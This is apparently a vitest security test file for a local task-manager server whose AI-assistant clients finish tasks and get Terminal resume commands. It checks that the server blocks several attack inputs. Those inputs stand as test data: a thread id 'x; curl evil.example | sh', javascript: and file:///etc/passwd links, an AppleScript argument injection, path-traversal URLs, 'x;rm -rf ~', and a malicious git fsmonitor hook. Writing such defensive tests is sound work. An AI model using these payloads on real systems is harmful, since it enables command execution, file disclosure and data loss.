// The security pass: each test here covers one thing an attacker could try. See SECURITY.md.
import { execFileSync, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { loadConfig } from '../server/config.ts';
import { resumeCommand } from '../server/threads.ts';
import { asClient, makeClient, startServer, tempDir, ui, type TestServer } from './helpers.ts';

const ROOT = path.resolve(import.meta.dirname, '..');
let s: TestServer;
let notifyLog: string;

beforeEach(async () => {
  s = await startServer({ env: { MT_NOTIFY_BIN: path.resolve(import.meta.dirname, 'fixtures/fake-notify.mjs') } });
  notifyLog = path.join(s.dir, 'notify.log');
  process.env.MT_NOTIFY_LOG = notifyLog;
});
afterEach(async () => {
  await s.stop();
});

const task = async (body: Record<string, unknown> = {}) => (await ui(s, 'POST', '/api/tasks', { title: 'A task', status: 'doing', ...body })).body.task;
const notified = async () => {
  for (let i = 0; i < 40 && !fs.existsSync(notifyLog); i++) await new Promise((r) => setTimeout(r, 50));
  return fs.existsSync(notifyLog) ? fs.readFileSync(notifyLog, 'utf8').trim().split('\n').map((l) => JSON.parse(l) as string[]) : [];
};
/** A stand-in for the built UI, so static files are served without a build. */
const fakeDist = () => {
  const dist = tempDir('mt-dist-');
  fs.writeFileSync(path.join(dist, 'index.html'), '<!doctype html><title>ui</title>');
  s.config.distDir = dist;
};
/** A raw request, so paths reach the server exactly as written. */
const raw = (p: string, headers: Record<string, string> = {}) =>
  new Promise<{ status: number; body: string; headers: http.IncomingHttpHeaders }>((resolve, reject) => {
    const req = http.get({ host: '127.0.0.1', port: s.port, path: p, headers: { host: `127.0.0.1:${s.port}`, ...headers } }, (res) => {
      let body = '';
      res.setEncoding('utf8');
      res.on('data', (c: string) => (body += c));
      res.on('end', () => resolve({ status: res.statusCode ?? 0, body, headers: res.headers }));
    });
    req.setTimeout(3000, () => req.destroy(new Error('timed out')));
    req.on('error', reject);
  });

describe('what an assistant says when it finishes a task', () => {
  it('only takes a plain thread id, since it ends up in a command you paste into Terminal', async () => {
    const { token } = await makeClient(s);
    const t = await task();
    const bad = await asClient(s, token, 'POST', `/api/tasks/${t.id}/complete`, { why: 'done', sessionId: 'x; curl evil.example | sh' });
    expect(bad.status).toBe(422);
    const ok = await asClient(s, token, 'POST', `/api/tasks/${t.id}/complete`, { why: 'done', sessionId: 'abc12345-thread' });
    expect(ok.status).toBe(200);
    expect(ok.body.task.finishedBy.sessionId).toBe('abc12345-thread');
  });

  it('only takes a web link as proof, never javascript:, file: or data:', async () => {
    const { token } = await makeClient(s);
    const t = await task();
    for (const link of ['javascript:alert(1)', 'file:///etc/passwd', 'data:text/html,<script>alert(1)</script>']) {
      expect((await asClient(s, token, 'POST', `/api/tasks/${t.id}/complete`, { why: 'done', link })).status).toBe(422);
    }
    const ok = await asClient(s, token, 'POST', `/api/tasks/${t.id}/complete`, { why: 'done', link: 'https://github.com/o/r/pull/1' });
    expect(ok.body.task.finishedBy.link).toBe('https://github.com/o/r/pull/1');
  });

  it('keeps text that starts with a dash as text in the Mac notification', async () => {
    const { token } = await makeClient(s, { name: '-e do shell script "touch /tmp/x"' });
    const t = await task({ title: '-x' });
    await asClient(s, token, 'POST', `/api/tasks/${t.id}/complete`, { why: '-h' });
    const [args] = await notified();
    expect(args[0]).toBe('-e');
    expect(args[2]).toBe('--');
    expect(args.slice(3)).toEqual(['-e do shell script "touch /tmp/x" finished a task', '-h', '-x']);
  });
});

describe('an assistant marking a task done with an edit', () => {
  it('gets the same checks as finishing it, and it waits in For you', async () => {
    const { token } = await makeClient(s, { name: 'Helper' });
    const open = await task({ title: 'Has a step left' });
    const withStep = (await ui(s, 'POST', `/api/tasks/${open.id}/subtasks`, { title: 'Last step' })).body.task;
    const withSub = await asClient(s, token, 'PATCH', `/api/tasks/${open.id}`, { baseRev: withStep.rev, patch: { status: 'done' } });
    expect(withSub.status).toBe(409);
    expect(withSub.body.error.message).toMatch(/Last step/);

    const flagged = await task({ title: 'Waiting on you' });
    await ui(s, 'POST', `/api/tasks/${flagged.id}/needs-you`, { text: 'Sign the form' });
    const rev = (await ui(s, 'GET', `/api/tasks/${flagged.id}`)).body.task.rev;
    expect((await asClient(s, token, 'PATCH', `/api/tasks/${flagged.id}`, { baseRev: rev, patch: { status: 'done' } })).status).toBe(409);

    const plain = await task({ title: 'Ready to finish' });
    const done = await asClient(s, token, 'PATCH', `/api/tasks/${plain.id}`, { baseRev: plain.rev, patch: { status: 'done' } });
    expect(done.status).toBe(200);
    expect(done.body.task.finishedBy).toMatchObject({ by: 'Helper' });
    const [args] = await notified();
    expect(args).toContain('Ready to finish');
  });

  it('needs the complete permission too', async () => {
    const { token } = await makeClient(s, { perms: ['read', 'update'] });
    const t = await task();
    expect((await asClient(s, token, 'PATCH', `/api/tasks/${t.id}`, { baseRev: t.rev, patch: { status: 'done' } })).status).toBe(403);
  });

  it('is quiet when you do it', async () => {
    const t = await task();
    const r = await ui(s, 'PATCH', `/api/tasks/${t.id}`, { baseRev: t.rev, patch: { status: 'done' } });
    expect(r.status).toBe(200);
    expect(r.body.task.finishedBy).toBeNull();
  });
});

describe('Needs you stays until you clear it', () => {
  it("an assistant can't blank it with spaces", async () => {
    const { token } = await makeClient(s);
    const t = await task();
    await ui(s, 'POST', `/api/tasks/${t.id}/needs-you`, { text: 'Call the bank' });
    const rev = (await ui(s, 'GET', `/api/tasks/${t.id}`)).body.task.rev;
    expect((await asClient(s, token, 'PATCH', `/api/tasks/${t.id}`, { baseRev: rev, patch: { needsYou: '   ' } })).status).toBe(403);
    expect((await ui(s, 'GET', `/api/tasks/${t.id}`)).body.task.needsYou).toBe('Call the bank');
  });

  it("an assistant can't delete a subtask that needs you, but you can", async () => {
    const { token } = await makeClient(s);
    const t = await task();
    await ui(s, 'POST', `/api/tasks/${t.id}/subtasks`, { title: 'Pick a date' });
    const flagged = await ui(s, 'POST', `/api/tasks/${t.id}/needs-you`, { subtask: 'Pick a date' });
    const sub = flagged.body.task.subtasks[0];
    expect(sub.needsYou).toBe(true);
    expect((await asClient(s, token, 'DELETE', `/api/tasks/${t.id}/subtasks/${sub.id}`)).status).toBe(403);
    expect((await ui(s, 'DELETE', `/api/tasks/${t.id}/subtasks/${sub.id}`)).status).toBe(200);
  });
});

describe('importing a file', () => {
  it('skips records with ids the app would never make, and keeps the rest tidy', async () => {
    const r = await ui(s, 'POST', '/api/import', {
      format: 'master-tasker-export',
      version: 1,
      areas: [{ id: '../../x', name: 'Bad area', color: '#000000' }],
      projects: [],
      tasks: [
        { id: 't_<img src=x>', title: 'Bad id' },
        { id: 't_AAAAAAAAAAAAAA', title: 'Good one', createdAt: 'not a date', completedAt: { x: 1 }, createdBy: 'x'.repeat(500) },
      ],
    });
    expect(r.status).toBe(200);
    expect(r.body).toMatchObject({ areas: 0, tasks: 1, skipped: 2 });
    const t = (await ui(s, 'GET', '/api/tasks/t_AAAAAAAAAAAAAA')).body.task;
    expect(t.title).toBe('Good one');
    expect(Number.isNaN(Date.parse(t.createdAt))).toBe(false);
    expect(t.completedAt).toBeNull();
    expect(t.createdBy.length).toBeLessThan(100);
  });
});

describe('the server itself', () => {
  it('keeps the database readable only by you', () => {
    const db = fs.statSync(s.config.dbPath).mode & 0o777;
    expect(db).toBe(0o600);
    expect(fs.statSync(s.config.dataDir).mode & 0o777).toBe(0o700);
  });

  it('marks API answers nosniff', async () => {
    const r = await ui(s, 'GET', '/api/tasks');
    expect(r.headers.get('x-content-type-options')).toBe('nosniff');
  });

  it('answers a broken %-escape with 400 instead of hanging', async () => {
    fakeDist();
    expect((await raw('/%E0%A4%A')).status).toBe(400);
    expect((await raw('/api/tasks/%E0%A4%A', { 'x-master-tasker': 'web' })).status).toBe(400);
  });

  it('never serves files outside the built UI', async () => {
    fakeDist();
    for (const p of ['/..%2f..%2fpackage.json', '/%2e%2e/%2e%2e/package.json', '/..%5c..%5cpackage.json']) {
      const r = await raw(p);
      expect(r.body).not.toContain('"name": "master-tasker"');
      expect([200, 403]).toContain(r.status);
    }
    expect((await raw('/..%2fsecret')).status).toBe(403);
  });

  it('refuses live events to other sites and to tokens', async () => {
    const { token } = await makeClient(s);
    expect((await raw('/api/events', { origin: 'http://evil.example' })).status).toBe(403);
    expect((await raw('/api/events', { 'sec-fetch-site': 'cross-site' })).status).toBe(403);
    expect((await raw('/api/events', { authorization: `Bearer ${token}` })).status).toBe(403);
  });

  it('only listens on this Mac unless you opt in', () => {
    const env = { MT_DATA_DIR: s.dir, MT_LOG_DIR: s.dir, MT_CLAUDE_BIN: '' };
    expect(() => loadConfig({ ...env, MT_HOST: '0.0.0.0' })).toThrow(/Refusing to bind/);
    expect(() => loadConfig({ ...env, MT_HOST: '192.168.1.5' })).toThrow(/Refusing to bind/);
    expect(loadConfig({ ...env, MT_HOST: '127.0.0.1' }).host).toBe('127.0.0.1');
  });
});

describe('commands it builds for Terminal', () => {
  it('quotes a thread id that is not plain', () => {
    expect(resumeCommand('', 'abc-123')).toBe('claude --resume abc-123');
    expect(resumeCommand('/tmp/a b', 'x;rm -rf ~')).toBe(`cd '/tmp/a b' && claude --resume 'x;rm -rf ~'`);
  });
});

describe('scanning code folders', () => {
  it("never runs a program a repo's own config names for git status", () => {
    const tmp = tempDir('mt-sec-scan-');
    const dev = path.join(tmp, 'development');
    const repo = path.join(dev, 'app');
    fs.mkdirSync(repo, { recursive: true });
    const g = (...args: string[]) => execFileSync('git', ['-c', 'user.email=me@example.com', '-c', 'user.name=Me', ...args], { cwd: repo, stdio: 'ignore' });
    g('init', '-q', '-b', 'main');
    fs.writeFileSync(path.join(repo, 'README.md'), 'app');
    g('add', '.');
    g('commit', '-q', '-m', 'start');
    const marker = path.join(tmp, 'ran');
    const hook = path.join(tmp, 'hook.sh');
    fs.writeFileSync(hook, `#!/bin/sh\ntouch '${marker}'\n`, { mode: 0o755 });
    g('config', 'core.fsmonitor', hook);
    fs.mkdirSync(path.join(tmp, 'claude-projects'));
    const r = spawnSync(process.execPath, ['automation/devscan.ts', 'scan'], {
      cwd: ROOT,
      encoding: 'utf8',
      env: { PATH: process.env.PATH!, HOME: tmp, MT_DEV_ROOTS: dev, MT_DATA_DIR: path.join(tmp, 'data'), MT_CLAUDE_PROJECTS_DIR: path.join(tmp, 'claude-projects'), MT_DEVSCAN_GH: '0' },
    });
    expect(r.status).toBe(0);
    expect(JSON.parse(r.stdout).active.map((p: { name: string }) => p.name)).toContain('app');
    expect(fs.existsSync(marker)).toBe(false);
    fs.rmSync(tmp, { recursive: true, force: true });
  });
});
